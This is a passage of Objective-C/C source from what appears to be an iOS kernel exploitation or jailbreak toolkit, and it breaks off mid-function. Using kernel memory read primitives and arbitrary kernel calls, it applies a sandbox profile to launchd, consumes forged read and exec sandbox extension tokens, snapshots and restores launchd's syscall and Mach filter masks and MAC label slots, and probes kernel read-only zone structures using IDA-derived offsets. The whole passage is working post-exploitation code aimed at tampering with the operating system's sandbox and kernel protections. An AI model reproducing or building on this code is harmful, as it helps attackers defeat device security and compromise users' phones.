static dt688a_policy_cmp_result_t dt688a_policy_compare(const dt688a_policy_snapshot_v1_t *base,
    const dt688a_policy_snapshot_v1_t *restored, void (^log)(NSString *line), BOOL *unix_match_out,
    BOOL *mach_match_out, BOOL *mig_match_out, BOOL *fmsg_match_out, BOOL *profile_match_out)
{
    BOOL unix_ok = dt688a_sem_pair_match(base->unix_sem, restored->unix_sem,
        base->unix_mask, restored->unix_mask, kDTUnixSyscallMaskBytes);
    BOOL mach_ok = dt688a_sem_pair_match(base->mach_sem, restored->mach_sem,
        base->mach_mask, restored->mach_mask, kDTMachTrapMaskBytes);
    BOOL mig_ok = dt688a_sem_pair_match(base->mig_sem, restored->mig_sem, NULL, NULL, 0);
    BOOL fmsg_ok = NO;
    BOOL profile_ok = NO;
    BOOL partial = NO;

    if (base->unix_sem == dt688a_fs_error || restored->unix_sem == dt688a_fs_error
        || base->mach_sem == dt688a_fs_error || restored->mach_sem == dt688a_fs_error
        || base->mig_sem == dt688a_fs_error || restored->mig_sem == dt688a_fs_error) {
        dt1025_log(log, @"[!] build689 compare aborted: ERROR state in baseline or restored");
        unix_ok = mach_ok = mig_ok = NO;
    }

    if (base->unix_sem == dt688a_fs_present && restored->unix_sem == dt688a_fs_present) {
        BOOL base_b36 = dt688a_unix_bit36_allowed(base->unix_mask, kDTUnixSyscallMaskBytes);
        BOOL rest_b36 = dt688a_unix_bit36_allowed(restored->unix_mask, kDTUnixSyscallMaskBytes);
        if (base_b36 != rest_b36) {
            dt1025_log(log, @"[!] build689 compare unix syscall bit36 mismatch base=%d restored=%d",
                base_b36 ? 1 : 0, rest_b36 ? 1 : 0);
            unix_ok = NO;
        }
    }

    if (base->filter_message_valid && restored->filter_message_valid
        && base->filter_message_flag == restored->filter_message_flag) {
        fmsg_ok = YES;
    }

    if ((base->profile_532c68 == 0 && restored->profile_532c68 == 0)
        || base->profile_532c68 == restored->profile_532c68) {
        profile_ok = YES;
    }

    if (base->proc_filter_flags != restored->proc_filter_flags)
        partial = YES;

    for (unsigned slot = 0; slot < 8; slot++) {
        if (base->label_slots[slot] != restored->label_slots[slot])
            partial = YES;
    }

    if (unix_match_out)
        *unix_match_out = unix_ok;
    if (mach_match_out)
        *mach_match_out = mach_ok;
    if (mig_match_out)
        *mig_match_out = mig_ok;
    if (fmsg_match_out)
        *fmsg_match_out = fmsg_ok;
    if (profile_match_out)
        *profile_match_out = profile_ok;

    dt1025_log(log,
        @"[*] build689 compare unix=%s/%s mach=%s/%s mig=%s/%s fmsg=%d profile=%d partial=%d",
        dt688a_sem_name(base->unix_sem), dt688a_sem_name(restored->unix_sem),
        dt688a_sem_name(base->mach_sem), dt688a_sem_name(restored->mach_sem),
        dt688a_sem_name(base->mig_sem), dt688a_sem_name(restored->mig_sem),
        fmsg_ok ? 1 : 0, profile_ok ? 1 : 0, partial ? 1 : 0);

    if (unix_ok && mach_ok && mig_ok && fmsg_ok && profile_ok && !partial)
        return dt688a_policy_cmp_match;
    if (unix_ok && mach_ok && mig_ok && fmsg_ok)
        return dt688a_policy_cmp_partial;
    return dt688a_policy_cmp_fail;
}

static BOOL dt688a_policy_mutated(const dt688a_policy_snapshot_v1_t *base,
    const dt688a_policy_snapshot_v1_t *mutated, void (^log)(NSString *line))
{
    BOOL changed = NO;

    if (base->profile_532c68 != mutated->profile_532c68)
        changed = YES;
    if (base->unix_sem != mutated->unix_sem)
        changed = YES;
    else if (base->unix_sem == dt688a_fs_present && mutated->unix_sem == dt688a_fs_present
        && memcmp(base->unix_mask, mutated->unix_mask, kDTUnixSyscallMaskBytes) != 0) {
        changed = YES;
    }
    if (base->mach_sem != mutated->mach_sem)
        changed = YES;
    else if (base->mach_sem == dt688a_fs_present && mutated->mach_sem == dt688a_fs_present
        && memcmp(base->mach_mask, mutated->mach_mask, kDTMachTrapMaskBytes) != 0) {
        changed = YES;
    }
    if (base->mig_sem != mutated->mig_sem)
        changed = YES;
    if (base->filter_message_flag != mutated->filter_message_flag)
        changed = YES;

    dt688a_log_semantic_line("MUTATED", mutated, log);
    dt1025_log(log, @"[*] build689 mutated_effective_policy_changed=%d", changed ? 1 : 0);
    return changed;
}

static int dt688a_wall2_restore(uint64_t proc_kptr, uint32_t baseline_fmsg,
    void (^log)(NSString *line), int *kern_ret_out)
{
    int kern = 0;

    if (dt688a_kcall_532a80_clear_slot0(proc_kptr, log) != 0)
        return -2;

    if (dt688a_kcall_filter_msg_set(proc_kptr, baseline_fmsg, log, &kern) != 0)
        return -3;
    if (kern != 0) {
        if (kern_ret_out)
            *kern_ret_out = kern;
        return -4;
    }

    if (dt688a_kcall_5329ac(proc_kptr, 0, log, &kern) != 0)
        return -5;
    if (kern_ret_out)
        *kern_ret_out = kern;
    if (kern != 0)
        return -6;

    return 0;
}

int dt688a_run_wall2_experiment(const char *consume_path, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt688a_stage("KCALL689_WALL2_BEGIN");

    if (!consume_path || !consume_path[0]) {
        dt1025_set_verdict(verdictOut, @"KCALL689_CONSUME_PATH_INVALID");
        return -1;
    }

    if (dt1025_kcall_init(log) != 0) {
        dt1025_set_verdict(verdictOut, g_dt1025_last_kcall_verdict ?: @"KCALL689_KCALL_INIT_FAIL");
        return -2;
    }

    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    if (!app_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL689_CALIBRATION_PROC_FAIL");
        return -3;
    }

    NSString *calFail = nil;
    if (dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL689_KCALL_CALIBRATION_FAIL");
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        return -4;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL689_LAUNCHD_PROC_FAIL");
        return -5;
    }

    dt688a_policy_snapshot_v1_t baseline = {0};
    dt688a_policy_snapshot_v1_t mutated = {0};
    dt688a_policy_snapshot_v1_t restored = {0};

    dt688a_stage("KCALL689_POLICY_BASELINE_BEGIN");
    if (dt688a_policy_snapshot_v1(launchd_proc, "POLICY_BASELINE_V1", &baseline, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_POLICY_BASELINE_FAIL");
        proc_rele(launchd_proc);
        return -6;
    }
    dt688a_log_snapshot_slots(&baseline, "POLICY_BASELINE_V1", log);
    dt688a_stage("KCALL689_POLICY_BASELINE_OK");
    dt688a_stage("KCALL689_BASELINE_CAPTURED");

    dt688a_stage("KCALL689_PROFILE_APPLY_BEGIN");
    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    int apply_kern_ret = -1;
    if (dt1025_kcall_53d540(launchd_proc, &bundle, log, &apply_kern_ret) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_PROFILE_APPLY_DISPATCH_FAIL");
        proc_rele(launchd_proc);
        return -7;
    }
    if (apply_kern_ret != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_PROFILE_APPLY_FAIL");
        proc_rele(launchd_proc);
        return -8;
    }
    dt688a_stage("KCALL689_PROFILE_APPLY_OK");

    char *read_token = dt1025_issue_token_path(kDTClassRead, consume_path, log);
    char *exec_token = dt1025_issue_token_path(kDTClassExec, consume_path, log);
    if (!read_token || !exec_token) {
        if (read_token)
            sandbox_extension_release(read_token);
        if (exec_token)
            sandbox_extension_release(exec_token);
        dt1025_set_verdict(verdictOut, @"KCALL689_EXTENSION_ISSUE_FAIL");
        proc_rele(launchd_proc);
        return -9;
    }

    int read_kern_ret = 0;
    int exec_kern_ret = 0;
    int64_t read_handle = dt1025_kcall_consume_token(launchd_proc, read_token, log, &read_kern_ret);
    int64_t exec_handle = dt1025_kcall_consume_token(launchd_proc, exec_token, log, &exec_kern_ret);
    sandbox_extension_release(read_token);
    sandbox_extension_release(exec_token);

    if (read_handle <= 0 || exec_handle <= 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_CONSUME_HANDLE_ZERO");
        proc_rele(launchd_proc);
        return -10;
    }
    dt688a_stage("KCALL689_CONSUME_READ_OK");
    dt688a_stage("KCALL689_CONSUME_EXEC_OK");

    dt688a_stage("KCALL689_POLICY_MUTATED_BEGIN");
    if (dt688a_policy_snapshot_v1(launchd_proc, "POLICY_MUTATED_V1", &mutated, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_POLICY_MUTATED_FAIL");
        proc_rele(launchd_proc);
        return -11;
    }
    if (!dt688a_policy_mutated(&baseline, &mutated, log)) {
        dt1025_log(log, @"[!] build688A effective policy did not change after cfprefsd apply");
    }
    dt688a_stage("KCALL689_POLICY_MUTATED_OK");

    dt688a_stage("KCALL689_POLICY_RESTORED_BEGIN");
    int restore_kern = 0;
    if (dt688a_wall2_restore(launchd_proc, baseline.filter_message_flag,
            log, &restore_kern) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_RESTORE_DISPATCH_FAIL");
        proc_rele(launchd_proc);
        return -12;
    }

    if (dt688a_policy_snapshot_v1(launchd_proc, "POLICY_RESTORED_V1", &restored, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL689_POLICY_RESTORED_FAIL");
        proc_rele(launchd_proc);
        return -13;
    }
    dt688a_stage("KCALL689_POLICY_RESTORED_OK");

    BOOL unix_match = NO;
    BOOL mach_match = NO;
    BOOL mig_match = NO;
    BOOL fmsg_match = NO;
    BOOL profile_match = NO;
    dt688a_policy_cmp_result_t cmp = dt688a_policy_compare(&baseline, &restored, log,
        &unix_match, &mach_match, &mig_match, &fmsg_match, &profile_match);

    if (!unix_match || !mach_match || !mig_match) {
        dt688a_stage("KCALL689_SEMANTIC_POLICY_MISMATCH");
    }

    if (cmp == dt688a_policy_cmp_match) {
        dt688a_stage("KCALL689_POLICY_READBACK_MATCH");
    } else if (cmp == dt688a_policy_cmp_partial) {
        dt688a_stage("KCALL689_POLICY_RESTORE_PARTIAL");
        dt1025_set_verdict(verdictOut, @"KCALL689_POLICY_RESTORE_PARTIAL");
        proc_rele(launchd_proc);
        return -14;
    } else {
        dt688a_stage("KCALL689_POLICY_RESTORE_FAIL");
        dt1025_set_verdict(verdictOut, @"KCALL689_POLICY_RESTORE_FAIL");
        proc_rele(launchd_proc);
        return -15;
    }

    dt1025_log(log, @"[*] build688A extension_state read_handle=%lld exec_handle=%lld "
        @"mutated_profile=0x%llx restored_profile=0x%llx",
        (long long)read_handle, (long long)exec_handle,
        (unsigned long long)mutated.profile_532c68,
        (unsigned long long)restored.profile_532c68);
    if (restored.profile_532c68 == mutated.profile_532c68 && mutated.profile_532c68 != 0)
        dt688a_stage("KCALL689_EXTENSION_STATE_CHANGED");
    else if (restored.profile_532c68 == baseline.profile_532c68)
        dt688a_stage("KCALL689_EXTENSION_STATE_PRESERVED");
    else
        dt688a_stage("KCALL689_EXTENSION_STATE_OPEN");

    if (restored.unix_sem == dt688a_fs_present) {
        if (!dt688a_unix_bit36_allowed(restored.unix_mask, kDTUnixSyscallMaskBytes)) {
            dt1025_log(log, @"[!] build689 restored unix PRESENT but syscall bit36 denied");
            dt1025_set_verdict(verdictOut, @"KCALL689_UNIX_BIT36_DENIED");
            proc_rele(launchd_proc);
            return -16;
        }
    } else if (baseline.unix_sem == dt688a_fs_null_default
        && restored.unix_sem == dt688a_fs_null_default) {
        dt1025_log(log, @"[*] build689 unix bit36 skipped: baseline/restored NULL_DEFAULT semantic match");
        dt688a_stage("KCALL689_UNIX_BIT36_SKIPPED_NULL_DEFAULT");
    }

    dt688a_stage("KCALL689_OBSERVE_BEGIN");
    dt1025_log(log, @"[*] build689 observe launchd sync interval (31s) — no opainject");
    sleep(31);

    if (kill(1, 0) != 0) {
        dt1025_log(log, @"[!] build688A launchd not alive errno=%d", errno);
        dt1025_set_verdict(verdictOut, @"KCALL689_LAUNCHD_DEAD_AFTER_SYNC");
        proc_rele(launchd_proc);
        return -17;
    }

    dt688a_stage("KCALL689_SYNC_INTERVAL_CROSSED");
    dt688a_stage("KCALL689_LAUNCHD_ALIVE_AFTER_SYNC_INTERVAL");
    dt688a_stage("KCALL689_WALL2_PASS");

    dt1025_set_verdict(verdictOut, @"KCALL689_WALL2_PASS");
    proc_rele(launchd_proc);
    return 0;
}

/* ==========================================================================
 * BUILD102690 — read-only baseline policy validator (audit §O/P)
 * No 53D540, 55106C, 532A80, 5329AC, opainject, AMFI, restore, or mutation.
 * ========================================================================== */

typedef enum {
    dt690_sem_error = -1,
    dt690_sem_null_zero = 0,
    dt690_sem_opaque = 1,
    dt690_sem_mask_kva = 2,
    dt690_sem_kernproc = 3,
    dt690_sem_ungated = 4,
    dt690_sem_cell_null = 5,
} dt690_policy_semantic_t;

typedef struct {
    uint64_t proc_kptr;
    uint64_t task_kptr;
    uint64_t kernproc_kptr;
    BOOL proc_is_kernproc;
    uint64_t proc_ro_kptr;
    uint64_t proc_ro_owner;
    uint8_t proc_ro_bytes[0x80];
    uint64_t unix_token;
    dt690_policy_semantic_t unix_sem;
    uint64_t mach_cell_kptr;
    uint64_t mach_cell_owner;
    uint64_t mach_token;
    dt690_policy_semantic_t mach_sem;
    dt690_policy_semantic_t mig_sem;
    uint32_t proc_filter_flags;
    uint64_t filter_ext_kptr;
    uint32_t mach_cell_w78;
    uint64_t profile_532c68;
    uint64_t label_kptr;
    uint64_t label_slot0;
    uint32_t filter_message_flag;
    uint64_t ecc3c0;
    uint64_t ecc3c8;
    uint64_t ecc3d0;
} dt690_baseline_v1_t;

static void dt690_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static const char *dt690_sem_name(dt690_policy_semantic_t sem)
{
    switch (sem) {
    case dt690_sem_null_zero: return "NULL_ZERO";
    case dt690_sem_opaque: return "OPAQUE";
    case dt690_sem_mask_kva: return "MASK_KVA";
    case dt690_sem_kernproc: return "KERNPROC";
    case dt690_sem_ungated: return "UNGATED";
    case dt690_sem_cell_null: return "CELL_NULL";
    default: return "ERROR";
    }
}

static NSString *dt690_hex_bytes(const uint8_t *bytes, size_t len)
{
    if (!bytes || !len)
        return @"";
    NSMutableString *hex = [NSMutableString stringWithCapacity:len * 2 + 1];
    for (size_t i = 0; i < len; i++)
        [hex appendFormat:@"%02x", bytes[i]];
    return hex;
}

static dt690_policy_semantic_t dt690_classify_unix_token(uint64_t proc_kptr, uint64_t cell,
    uint64_t token, void (^log)(NSString *line))
{
    uint64_t kernproc = dt688a_runtime_kernproc_kptr();
    if (kernproc && proc_kptr == kernproc) {
        dt1025_log(log, @"[*] build690 unix: proc==*kernproc → KERNPROC (IDA 5EC764)");
        return dt690_sem_kernproc;
    }
    if (!cell) {
        dt1025_log(log, @"[!] build690 unix: proc_ro cell missing");
        return dt690_sem_error;
    }
    if (kread64(cell) != proc_kptr) {
        dt1025_log(log, @"[!] build690 unix: [cell+0]=0x%llx != proc (IDA 5EC74C)",
            (unsigned long long)kread64(cell));
        return dt690_sem_error;
    }
    if (token == 0) {
        dt1025_log(log, @"[*] build690 unix: [cell+0x10]==0 → NULL_ZERO (IDA 5EC8F4 CBZ)");
        return dt690_sem_null_zero;
    }
    if (dt1025_kernel_range_kptr(token)) {
        dt1025_log(log, @"[*] build690 unix: token=0x%llx → MASK_KVA",
            (unsigned long long)token);
        return dt690_sem_mask_kva;
    }
    dt1025_log(log, @"[*] build690 unix: token=0x%llx → OPAQUE (never dereference)",
        (unsigned long long)token);
    return dt690_sem_opaque;
}

static dt690_policy_semantic_t dt690_classify_mach_token(uint64_t proc_kptr, uint32_t pflags,
    uint64_t *cell_out, uint64_t *token_out, uint32_t *w78_out, void (^log)(NSString *line))
{
    if ((pflags & 2u) == 0) {
        dt1025_log(log, @"[*] build690 mach: proc+0x458 bit2 clear → UNGATED (IDA 5EC9AC)");
        return dt690_sem_ungated;
    }

    uint64_t filter_ext = proc_kptr + kDTProcFilterExtOff;
    uint64_t cell = kread_ptr(filter_ext + kDTFilterExtMachCellOff);
    if (cell_out)
        *cell_out = cell;
    if (!cell) {
        dt1025_log(log, @"[*] build690 mach: ext+0x370 cell NULL → CELL_NULL");
        return dt690_sem_cell_null;
    }
    if (kread64(cell + 8ULL) != filter_ext) {
        dt1025_log(log, @"[!] build690 mach: [cell+8]!=filter_ext (IDA 239504)");
        return dt690_sem_error;
    }

    uint64_t token = kread_ptr(cell + 0x10ULL);
    if (token_out)
        *token_out = token;
    if (w78_out)
        *w78_out = kread32(cell + 0x78ULL);

    if (token == 0) {
        dt1025_log(log, @"[*] build690 mach: [cell+0x10]==0 → NULL_ZERO (IDA 5EC9C0 CBZ)");
        return dt690_sem_null_zero;
    }
    if (dt1025_kernel_range_kptr(token)) {
        dt1025_log(log, @"[*] build690 mach: token=0x%llx → MASK_KVA",
            (unsigned long long)token);
        return dt690_sem_mask_kva;
    }
    dt1025_log(log, @"[*] build690 mach: token=0x%llx → OPAQUE",
        (unsigned long long)token);
    return dt690_sem_opaque;
}

static dt690_policy_semantic_t dt690_classify_mig(const dt690_baseline_v1_t *snap,
    void (^log)(NSString *line))
{
    if (snap->mach_sem == dt690_sem_ungated || snap->mach_sem == dt690_sem_cell_null)
        return dt690_sem_null_zero;

    uint64_t default_mig = snap->ecc3d0;
    if (default_mig == 0 && snap->profile_532c68) {
        uint64_t profile_mig = kread_ptr(snap->profile_532c68 + 48ULL);
        if (profile_mig == 0) {
            dt1025_log(log, @"[*] build690 mig: ECC3D0+profile NULL → NULL_ZERO");
            return dt690_sem_null_zero;
        }
    }
    if (snap->mach_sem == dt690_sem_mask_kva || snap->mach_sem == dt690_sem_opaque)
        return dt690_sem_null_zero;
    return dt690_sem_null_zero;
}

static int dt690_fill_baseline(uint64_t proc_kptr, dt690_baseline_v1_t *out,
    void (^log)(NSString *line))
{
    if (!out)
        return -1;
    memset(out, 0, sizeof(*out));

    out->proc_kptr = proc_kptr;
    out->task_kptr = proc_task(proc_kptr);
    out->kernproc_kptr = dt688a_runtime_kernproc_kptr();
    out->proc_is_kernproc = out->kernproc_kptr && proc_kptr == out->kernproc_kptr;

    out->proc_ro_kptr = kread_ptr(proc_kptr + koffsetof(proc, proc_ro));
    if (out->proc_ro_kptr)
        out->proc_ro_owner = kread64(out->proc_ro_kptr);
    if (out->proc_ro_kptr)
        (void)kreadbuf(out->proc_ro_kptr, out->proc_ro_bytes, sizeof(out->proc_ro_bytes));

    out->unix_token = out->proc_ro_kptr ? kread_ptr(out->proc_ro_kptr + 0x10ULL) : 0;
    out->unix_sem = dt690_classify_unix_token(proc_kptr, out->proc_ro_kptr, out->unix_token, log);
    if (out->unix_sem == dt690_sem_error)
        return -2;

    out->proc_filter_flags = kread32(proc_kptr + kDTProcFilterFlagsOff);
    if (out->proc_filter_flags & 2u)
        out->filter_ext_kptr = proc_kptr + kDTProcFilterExtOff;

    out->mach_sem = dt690_classify_mach_token(proc_kptr, out->proc_filter_flags,
        &out->mach_cell_kptr, &out->mach_token, &out->mach_cell_w78, log);
    if (out->mach_sem == dt690_sem_error)
        return -3;
    if (out->mach_cell_kptr)
        out->mach_cell_owner = kread64(out->mach_cell_kptr + 8ULL);

    out->ecc3c0 = kread_ptr(dt1025_kva(kDTUnslidDefaultUnixMaskSlot));
    out->ecc3c8 = kread_ptr(dt1025_kva(kDTUnslidDefaultMachMaskSlot));
    out->ecc3d0 = kread_ptr(dt1025_kva(kDTUnslidDefaultMigMaskSlot));

    if (dt688a_kcall_532c68(proc_kptr, log, &out->profile_532c68) != 0)
        return -4;

    uint64_t ucred = proc_ucred(proc_kptr);
    if (ucred)
        out->label_kptr = kread_ptr(ucred + koffsetof(ucred, label));
    out->label_slot0 = dt1025_label_slot_raw(out->label_kptr, 0);

    out->mig_sem = dt690_classify_mig(out, log);

    int fmsg_kern = -1;
    if (dt688a_kcall_filter_msg_get(proc_kptr, &out->filter_message_flag, log, &fmsg_kern) != 0)
        return -5;
    if (fmsg_kern != 0) {
        dt1025_log(log, @"[!] build690 proc_get_filter_message_flag kern_ret=%d", fmsg_kern);
        return -6;
    }

    return 0;
}

static void dt690_log_baseline_table(const dt690_baseline_v1_t *b, void (^log)(NSString *line))
{
    dt1025_log(log, @"[*] build690 BASELINE_TABLE proc=0x%llx *kernproc=0x%llx proc==kernproc=%d",
        (unsigned long long)b->proc_kptr,
        (unsigned long long)b->kernproc_kptr,
        b->proc_is_kernproc ? 1 : 0);
    dt1025_log(log, @"[*] build690 BASELINE_TABLE proc_ro=0x%llx owner=0x%llx unix_token=0x%llx "
        @"unix_sem=%s",
        (unsigned long long)b->proc_ro_kptr,
        (unsigned long long)b->proc_ro_owner,
        (unsigned long long)b->unix_token,
        dt690_sem_name(b->unix_sem));
    dt1025_log(log, @"[*] build690 BASELINE_TABLE proc+0x458=0x%x ext=0x%llx mach_cell=0x%llx "
        @"mach_token=0x%llx mach_sem=%s cell+0x78=0x%x",
        (unsigned)b->proc_filter_flags,
        (unsigned long long)b->filter_ext_kptr,
        (unsigned long long)b->mach_cell_kptr,
        (unsigned long long)b->mach_token,
        dt690_sem_name(b->mach_sem),
        (unsigned)b->mach_cell_w78);
    dt1025_log(log, @"[*] build690 BASELINE_TABLE mig_sem=%s fmsg=%u profile=0x%llx slot0=0x%llx",
        dt690_sem_name(b->mig_sem),
        (unsigned)b->filter_message_flag,
        (unsigned long long)b->profile_532c68,
        (unsigned long long)b->label_slot0);
    dt1025_log(log, @"[*] build690 BASELINE_TABLE runtime ECC3C0=0x%llx ECC3C8=0x%llx ECC3D0=0x%llx",
        (unsigned long long)b->ecc3c0,
        (unsigned long long)b->ecc3c8,
        (unsigned long long)b->ecc3d0);
    dt1025_log(log, @"[*] build690 proc_ro[0x00..0x7F]=%@",
        dt690_hex_bytes(b->proc_ro_bytes, sizeof(b->proc_ro_bytes)));
}

int dt690_run_baseline_validator(void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt690_stage("KCALL690_BASELINE_BEGIN");
    dt1025_log(log, @"[*] Build690 — read-only baseline policy validator (no restore/mutation)");

    if (dt1025_kcall_init(log) != 0) {
        dt1025_set_verdict(verdictOut, g_dt1025_last_kcall_verdict ?: @"KCALL690_KCALL_INIT_FAIL");
        return -1;
    }

    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    if (!app_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL690_CALIBRATION_PROC_FAIL");
        return -2;
    }

    NSString *calFail = nil;
    if (dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        dt1025_set_verdict(verdictOut, calFail ?: @"KCALL690_KCALL_CALIBRATION_FAIL");
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        return -3;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc) {
        dt1025_set_verdict(verdictOut, @"KCALL690_LAUNCHD_PROC_FAIL");
        return -4;
    }

    dt690_baseline_v1_t baseline = {0};
    dt690_stage("KCALL690_POLICY_BASELINE_BEGIN");
    int fill_r = dt690_fill_baseline(launchd_proc, &baseline, log);
    if (fill_r != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL690_POLICY_BASELINE_FAIL");
        proc_rele(launchd_proc);
        return -5;
    }

    dt690_log_baseline_table(&baseline, log);
    dt690_stage("KCALL690_POLICY_BASELINE_OK");
    dt690_stage("KCALL690_BASELINE_VALIDATOR_PASS");

    dt1025_log(log, @"[*] build690 semantic summary unix=%s mach=%s mig=%s "
        @"(OPAQUE accepted; no kreadbuf on non-KVA tokens)",
        dt690_sem_name(baseline.unix_sem),
        dt690_sem_name(baseline.mach_sem),
        dt690_sem_name(baseline.mig_sem));

    dt1025_set_verdict(verdictOut, @"KCALL690_BASELINE_VALIDATOR_PASS");
    proc_rele(launchd_proc);
    return 0;
}

/* ==========================================================================
 * BUILD102691 — corrected read-only baseline (direct fmsg kread + RO zone)
 * Replaces unsafe proc_get_filter_message_flag kcall. 532C68 sole kcall.
 * ========================================================================== */

typedef enum {
    dt691_fmsg_state_error = -1,
    dt691_fmsg_state_ungated = 0,
    dt691_fmsg_state_flag_0 = 1,
    dt691_fmsg_state_flag_1 = 2,
    dt691_fmsg_state_cell_null_diagnostic = 3,
} dt691_fmsg_state_t;

typedef struct {
    uint64_t ro_lo;
    uint64_t ro_hi;
    uint64_t meta_base;
    uint32_t z5_table;
} dt691_ro_zone_globals_t;

typedef struct {
    uint64_t proc_kptr;
    uint64_t task_kptr;
    uint64_t kernproc_kptr;
    BOOL proc_is_kernproc;
    uint64_t proc_ro_kptr;
    uint64_t proc_ro_owner;
    uint8_t proc_ro_bytes[0x80];
    uint64_t unix_token;
    dt690_policy_semantic_t unix_sem;
    uint64_t mach_cell_kptr;
    uint64_t mach_cell_owner;
    uint64_t mach_token;
    dt690_policy_semantic_t mach_sem;
    dt690_policy_semantic_t mig_sem;
    uint32_t proc_filter_flags;
    uint64_t filter_ext_kptr;
    uint32_t mach_cell_w78;
    uint64_t profile_532c68;
    uint64_t label_kptr;
    uint64_t label_slot0;
    dt691_fmsg_state_t fmsg_state;
    BOOL fmsg_valid;
    uint32_t filter_message_flag;
    uint64_t ecc3c0;
    uint64_t ecc3c8;
    uint64_t ecc3d0;
} dt691_baseline_v1_t;

static void dt691_stage(const char *marker)
{
    dt1025_stage([NSString stringWithUTF8String:marker]);
}

static const char *dt691_fmsg_state_name(dt691_fmsg_state_t st)
{
    switch (st) {
    case dt691_fmsg_state_ungated: return "UNGATED";
    case dt691_fmsg_state_flag_0: return "FLAG_0";
    case dt691_fmsg_state_flag_1: return "FLAG_1";
    case dt691_fmsg_state_cell_null_diagnostic: return "CELL_NULL_DIAGNOSTIC";
    default: return "ERROR";
    }
}

static int dt691_load_ro_zone_globals(dt691_ro_zone_globals_t *g, void (^log)(NSString *line))
{
    if (!g)
        return -1;
    g->ro_lo = kread64(dt1025_kva(kDTUnslidROZoneLo));
    g->ro_hi = kread64(dt1025_kva(kDTUnslidROZoneHi));
    g->meta_base = kread64(dt1025_kva(kDTUnslidROZoneMeta));
    g->z5_table = kread32(dt1025_kva(kDTUnslidROZone5TableDword));
    dt1025_log(log, @"[*] build691 RO globals lo=0x%llx hi=0x%llx meta=0x%llx z5_table=0x%x",
        (unsigned long long)g->ro_lo,
        (unsigned long long)g->ro_hi,
        (unsigned long long)g->meta_base,
        (unsigned)g->z5_table);
    if (!g->ro_lo || !g->ro_hi || g->ro_hi <= g->ro_lo || !g->meta_base)
        return -2;
    return 0;
}

static BOOL dt691_ro_zone_align_fail(uint32_t z5_table, uint64_t cell)
{
    uint32_t rem = 0x4000u - (uint32_t)(cell & 0x3fffu);
    uint32_t prod = (uint32_t)(z5_table * rem);
    return prod >= z5_table;
}

static int dt691_read_filter_message_kread(uint64_t proc_kptr,
    const dt691_ro_zone_globals_t *ro,
    dt691_fmsg_state_t *state_out,
    BOOL *fmsg_valid_out,
    uint32_t *fmsg_out,
    void (^log)(NSString *line))
{
    if (!ro || !state_out || !fmsg_valid_out)
        return -1;

    *fmsg_valid_out = NO;
    if (fmsg_out)
        *fmsg_out = 0;

    uint32_t pflags = kread32(proc_kptr + kDTProcFilterFlagsOff);
    if ((pflags & 2u) == 0) {
        *state_out = dt691_fmsg_state_ungated;
        *fmsg_valid_out = YES;
        if (fmsg_out)
            *fmsg_out = 0;
        dt1025_log(log, @"[*] build691 fmsg: gate clear → UNGATED fmsg_valid=1 fmsg=0");
        return 0;
    }

    uint64_t ext = proc_kptr + kDTProcFilterExtOff;
    uint64_t cell = kread64(ext + kDTFilterExtMachCellOff);
    if (!cell) {
        *state_out = dt691_fmsg_state_cell_null_diagnostic;
        *fmsg_valid_out = NO;
        dt1025_log(log, @"[*] build691 fmsg: gated cell NULL → CELL_NULL_DIAGNOSTIC "
            @"fmsg_valid=0 (getter would panic; not FLAG_0/UNGATED)");
        return 0;
    }

    if (cell < ro->ro_lo || cell >= ro->ro_hi) {
        dt1025_log(log, @"[!] build691 fmsg: cell 0x%llx outside [lo,hi) (IDA 239490)",
            (unsigned long long)cell);
        *state_out = dt691_fmsg_state_error;
        return -2;
    }

    if (dt691_ro_zone_align_fail(ro->z5_table, cell)) {
        uint32_t rem = 0x4000u - (uint32_t)(cell & 0x3fffu);
        uint32_t prod = (uint32_t)(ro->z5_table * rem);
        dt1025_log(log, @"[!] build691 fmsg: align fail prod=0x%x z5_table=0x%x rem=0x%x "
            @"(32-bit MUL, IDA 2394B0)",
            (unsigned)prod, (unsigned)ro->z5_table, (unsigned)rem);
        *state_out = dt691_fmsg_state_error;
        return -3;
    }

    uint32_t idx = (uint32_t)((cell >> 14) & 0xffffffffu);
    uint16_t meta_u16 = (uint16_t)(kread32(ro->meta_base + ((uint64_t)idx << 4)) & 0xffffu);
    if ((meta_u16 & 0x3ffu) != 5u) {
        dt1025_log(log, @"[!] build691 fmsg: zone index 0x%x != 5 (IDA 2394D4)",
            (unsigned)(meta_u16 & 0x3ffu));
        *state_out = dt691_fmsg_state_error;
        return -4;
    }

    if (kread64(cell + 8ULL) != ext) {
        dt1025_log(log, @"[!] build691 fmsg: owner mismatch [cell+8]!=ext (IDA 2394E0)");
        *state_out = dt691_fmsg_state_error;
        return -5;
    }

    uint32_t w78 = kread32(cell + 0x78ULL);
    uint32_t fmsg = (w78 >> 14) & 1u;
